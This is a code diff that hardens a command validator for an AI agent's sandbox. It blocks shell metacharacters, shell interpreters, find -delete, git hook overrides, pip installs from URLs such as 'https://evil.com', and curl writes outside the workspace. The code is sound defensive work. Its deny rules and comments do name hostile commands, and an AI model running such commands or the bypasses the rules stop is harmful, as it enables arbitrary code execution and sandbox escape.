@@ -76,7 +76,170 @@ export function buildSandboxEnv(
 
 type ValidationResult = { valid: true } | { valid: false; reason: string };
 
-const SHELL_METACHAR_PATTERN = /[;|&`$]|\$\(/;
+const SHELL_METACHAR_PATTERN = /[;|&`$\n\r\0]|\$\(/;
+
+/**
+ * Checks if a path is inside /workspace after normalization.
+ * Prevents traversal bypasses like `/workspace/../tmp` and prefix
+ * confusion like `/workspace-backdoor`.
+ */
+function isInsideWorkspace(target: string): boolean {
+  const normalized = normalize(target);
+  return normalized === '/workspace' || normalized.startsWith('/workspace/');
+}
+
+/**
+ * Known shell interpreters that defeat the command allowlist when included.
+ * Any of these binaries can execute arbitrary commands via `-c` or script arguments,
+ * rendering the allowlist meaningless. Removed from defaults; emits a warning if
+ * an administrator re-adds them via custom config.
+ */
+export const SHELL_INTERPRETERS: ReadonlySet<string> = Object.freeze(
+  new Set(['bash', 'sh', 'dash', 'zsh', 'csh', 'ksh', 'fish']),
+);
+
+/**
+ * Per-binary rules that block only genuinely destructive or stealth-attack argument
+ * patterns. The sandbox itself (bubblewrap namespace isolation, workspace restriction,
+ * timeout) is the primary security boundary — these rules catch the narrow set of
+ * actions that are destructive or bypass sandbox awareness.
+ *
+ * Design principle: give the agent maximum developer-like power; only block what's
+ * truly destructive, not what's merely powerful.
+ */
+export const DANGEROUS_ARG_RULES: ReadonlyMap<
+  string,
+  { check: (args: string[]) => string | null }
+> = new Map([
+  [
+    'find',
+    {
+      check: (args) => {
+        // Only block -delete (destructive mass deletion). Allow -exec/-execdir
+        // because the sandbox itself limits blast radius and the agent needs
+        // these for legitimate developer workflows like find-and-replace.
+        if (args.includes('-delete')) {
+          return (
+            '"find -delete" performs mass file deletion. ' +
+            'Use "find -name ... -print" to list files, then remove specific files with "rm" instead.'
+          );
+        }
+        return null;
+      },
+    },
+  ],
+  [
+    'git',
+    {
+      check: (args) => {
+        // Block hook overrides that execute code outside the sandbox's awareness.
+        // These are stealth attack vectors, not legitimate developer workflows.
+        for (let i = 0; i < args.length; i++) {
+          const a = args[i];
+          // Separate arg form: git -c core.hooksPath=...
+          // Git config names are case-insensitive per git-scm.com docs
+          if (a === '-c' && i + 1 < args.length) {
+            const val = args[i + 1]?.toLowerCase();
+            if (val && (val.startsWith('core.hookspath') || val.startsWith('core.sshcommand'))) {
+              return (
+                `"git -c ${val}" can execute arbitrary code via hooks. ` +
+                'Use standard git commands like clone, pull, push, status instead.'
+              );
+            }
+          }
+          // Concatenated form: git -ccore.hooksPath=...
+          const lower = a.toLowerCase();
+          if (lower.startsWith('-ccore.hookspath') || lower.startsWith('-ccore.sshcommand')) {
+            return (
+              `"git ${a}" can execute arbitrary code via hooks. ` +
+              'Use standard git commands like clone, pull, push, status instead.'
+            );
+          }
+        }
+        return null;
+      },
+    },
+  ],
+  [
+    'pip',
+    {
+      check: (args) => {
+        // Find 'install' subcommand anywhere — pip allows global opts before it
+        // (e.g., pip --isolated install ...)
+        const installIdx = args.indexOf('install');
+        if (installIdx >= 0) {
+          // Block installs from URLs or absolute paths outside workspace —
+          // these can serve malicious packages with arbitrary setup.py code.
+          // Normal PyPI installs (pip install flask) are allowed — PyPI has
+          // its own security and the sandbox limits blast radius.
+          for (const a of args.slice(installIdx + 1)) {
+            if (
+              a.startsWith('http://') ||
+              a.startsWith('https://') ||
+              a.startsWith('ftp://') ||
+              a.startsWith('file://') ||
+              a.startsWith('git+') ||
+              a.startsWith('svn+') ||
+              a.startsWith('hg+') ||
+              a.startsWith('bzr+')
+            ) {
+              return (
+                '"pip install" from a URL can execute arbitrary code from untrusted sources. ' +
+                'Use "pip install <package-name>" to install from PyPI instead.'
+              );
+            }
+            if (a.startsWith('/') && !isInsideWorkspace(a)) {
+              return (
+                '"pip install" from a path outside the workspace is not allowed. ' +
+                'Use "pip install ./" or "pip install <package-name>" from PyPI instead.'
+              );
+            }
+          }
+        }
+        return null;
+      },
+    },
+  ],
+  [
+    'curl',
+    {
+      check: (args) => {
+        // Block -o/--output to absolute paths outside workspace.
+        // Downloading to workspace or stdout is fine — the agent needs
+        // curl for API calls and downloading dependencies.
+        for (let i = 0; i < args.length; i++) {
+          const a = args[i];
+          if (a === '-o' || a === '--output') {
+            const target = args[i + 1] ?? '';
+            if (target.startsWith('/') && !isInsideWorkspace(target)) {
+              return (
+                `"curl -o ${target}" writes outside the workspace. ` +
+                'Use "curl" without -o to print to stdout, or use -o with a workspace-relative path.'
+              );
+            }
+          }
+          if (a.startsWith('-o/') && !isInsideWorkspace(a.slice(2))) {
+            return (
+              `"curl ${a}" writes outside the workspace. ` +
+              'Use "curl" without -o or target a workspace-relative path.'
+            );
+          }
+          // Equals-separated form: --output=/usr/bin/payload
+          if (a.startsWith('--output=')) {
+            const target = a.slice('--output='.length);
+            if (target.startsWith('/') && !isInsideWorkspace(target)) {
+              return (
+                `"curl ${a}" writes outside the workspace. ` +
+                'Use "curl" without --output or target a workspace-relative path.'
+              );
+            }
+          }
+        }
+        return null;
+      },
+    },
+  ],
+]);
 
 export class SandboxCommandValidator {
   private readonly allowedCommands: Set<string>;
@@ -85,6 +248,17 @@ export class SandboxCommandValidator {
   constructor(config: SandboxConfig) {
     this.allowedCommands = new Set(config.allowedCommands);
     this.deniedPatterns = config.deniedPatterns.map((p) => new RegExp(p));
+
+    // Warn if shell interpreters are in the allowlist (admin override)
+    for (const cmd of config.allowedCommands) {
+      if (SHELL_INTERPRETERS.has(cmd)) {
+        logger.warn(
+          `Shell interpreter "${cmd}" is in allowedCommands. ` +
+            'This defeats the command allowlist — any command can be run via ' +
+            `"${cmd} -c <command>". Remove it unless you have a specific need.`,
+        );
+      }
+    }
   }
 
   validateCommand(command: string): ValidationResult {
@@ -98,14 +272,18 @@ export class SandboxCommandValidator {
       return {
         valid: false,
         reason:
-          'Shell metacharacters (&&, ||, ;, |, $, `) are not allowed. ' +
+          'Shell metacharacters (;, |, &, $, `, newlines) are not allowed. ' +
           'Run one command per sandbox_exec call. ' +
           'For multi-step tasks, make separate sequential calls.',
       };
     }
 
-    const binary = trimmed.split(/\s+/)[0];
+    const parts = trimmed.split(/\s+/);
+    const binary = parts[0];
     const baseBinary = binary.split('/').pop() ?? binary;
+    // Strip surrounding quotes from args to prevent bypass via quoting
+    // (e.g., find "-delete" or pip install "https://evil.com")
+    const args = parts.slice(1).map((a) => a.replace(/^["']|["']$/g, ''));
 
     if (!this.allowedCommands.has(baseBinary)) {
       const allowed = [...this.allowedCommands].sort().join(', ');
@@ -115,11 +293,20 @@ export class SandboxCommandValidator {
       };
     }
 
+    // Check per-binary dangerous argument rules (destructive/stealth actions only)
+    const argRule = DANGEROUS_ARG_RULES.get(baseBinary);
+    if (argRule) {
+      const rejection = argRule.check(args);
+      if (rejection) {
+        return { valid: false, reason: rejection };
+      }
+    }
+
     for (const pattern of this.deniedPatterns) {
       if (pattern.test(trimmed)) {
         return {
           valid: false,
-          reason: `Command matches denied pattern: ${pattern.source}`,
+          reason: `Command matches denied pattern: ${pattern.source}. Try a safer alternative.`,
         };
       }
     }
